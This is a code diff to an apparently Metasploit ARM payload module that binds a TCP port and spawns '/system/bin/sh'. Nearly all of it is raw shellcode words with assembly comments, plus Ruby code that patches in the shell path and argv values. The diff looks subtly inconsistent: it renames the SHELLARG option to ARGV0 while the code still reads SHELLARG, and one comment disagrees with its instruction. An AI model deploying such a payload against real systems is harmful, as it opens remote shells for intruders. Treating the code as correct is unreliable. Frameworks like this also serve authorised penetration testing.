@@ -29,8 +29,8 @@ module Metasploit3
         {
           'Offsets' =>
             {
-              'RHOST'    => [ 208, 'ADDR' ],
-              'LPORT'    => [ 206, 'n' ],
+              'RHOST'    => [ 172, 'ADDR' ],
+              'LPORT'    => [ 170, 'n' ],
             },
           'Payload' =>
             [
@@ -45,7 +45,7 @@ module Metasploit3
               0xe1a06000, # mov     r6, r0
 
               # bind
-              0xe28f10A4, # 1dr     r1, pc, #172  ; 0x9C
+              0xe28f1080, # 1dr     r1, pc, #128
               0xe3a02010, # mov     r2, #16
               0xe3a07001, # mov     r7, #1
               0xe1a07407, # lsl     r7, r7, #8
@@ -78,25 +78,14 @@ module Metasploit3
               0x5afffffa, # bpl     8c <.text+0x8c>
 
               # execve("/system/bin/sh", args, env)
-              0xe28f0048, # add     r0, pc, #72     ; 0xe40
+              0xe28f0024, # add     r0, pc, #36     ; 0x24
               0xe0244004, # eor     r4, r4, r4
               0xe92d0010, # push    {r4}
               0xe1a0200d, # mov     r2, sp
-              0xe92d0004, # push    {r2}
-              0xe1a0200d, # mov     r2, sp
+              0xe28f4024, # add     r4, pc, #36     ; 0x10
               0xe92d0010, # push    {r4}
-              0xe59f1048, # ldr     r1, [pc, #72]   ; 8124 <env+0xe8>
-              0xe92d0002, # push    {r1}
-              0xe92d2000, # push    {sp}
               0xe1a0100d, # mov     r1, sp
-              0xe92d0004, # push    {r2}
-              0xe1a0200d, # mov     r2, sp
-              0xe3a0700b, # mov     r7, #11 ; 0xeb
-              0xef000000, # svc     0x00000000
-
-              # exit(0)
-              0xe3a00000, # mov     r0, #0  ; 0x0
-              0xe3a07001, # mov     r7, #1  ; 0x1
+              0xe3a0700b, # mov     r7, #11 ; 0xb
               0xef000000, # svc     0x00000000
 
               # <af>:
@@ -110,7 +99,10 @@ module Metasploit3
               0x00000000, # .word   0x00000000
 
               # <arg>:
-              0x00000000  # .word   0x00000000 ; the args!
+              0x00000000, # .word   0x00000000 ; the args!
+              0x00000000, # .word   0x00000000
+              0x00000000, # .word   0x00000000
+              0x00000000, # .word   0x00000000
 
             ].pack("V*")
         }
@@ -120,7 +112,7 @@ module Metasploit3
     register_options(
       [
         OptString.new('SHELL', [ true, "The shell to execute.", "/system/bin/sh" ]),
-        OptString.new('SHELLARG', [ false, "The argument to pass to the shell.", "-C" ])
+        OptString.new('ARGV0', [ false, "argv[0] to pass to execve", "sh" ]) # mostly used for busybox
       ], self.class)
   end
 
@@ -131,14 +123,14 @@ module Metasploit3
     if sh.length >= 16
       raise ArgumentError, "The specified shell must be less than 16 bytes."
     end
-    p[212, sh.length] = sh
+    p[176, sh.length] = sh
 
     arg = datastore['SHELLARG']
     if arg
-      if arg.length >= 4
-        raise ArgumentError, "The specified shell argument must be less than 4 bytes."
+      if arg.length >= 16
+        raise ArgumentError, "The specified argv[0] must be less than 16 bytes."
       end
-      p[228, arg.length] = arg
+      p[192, arg.length] = arg
     end
 
     p
